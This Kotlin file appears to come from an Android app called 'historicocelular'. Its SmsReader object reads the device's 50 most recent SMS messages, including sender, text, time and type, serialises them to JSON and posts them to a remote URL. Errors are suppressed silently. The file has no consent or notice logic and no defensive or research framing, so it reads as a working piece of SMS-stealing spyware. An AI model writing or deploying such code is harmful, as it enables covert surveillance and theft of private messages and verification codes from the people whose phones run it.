package com.example.historicocelular

import android.content.Context
import org.json.JSONArray
import org.json.JSONObject

object SmsReader {
    fun enviar(ctx: Context, url: String) {
        try {
            val cursor = ctx.contentResolver.query(
                android.net.Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type"),
                null, null, "date DESC LIMIT 50"
            )
            val lista = JSONArray()
            cursor?.use {
                while (it.moveToNext()) {
                    val item = JSONObject().apply {
                        put("de", it.getString(0) ?: "")
                        put("texto", it.getString(1) ?: "")
                        put("ts", it.getLong(2))
                        put("tipo", it.getInt(3).toString())
                    }
                    lista.put(item)
                }
            }
            val json = JSONObject().apply { put("sms", lista) }
            DataSender.postar(url, "sms", json)
        } catch (e: Exception) {}
    }
}
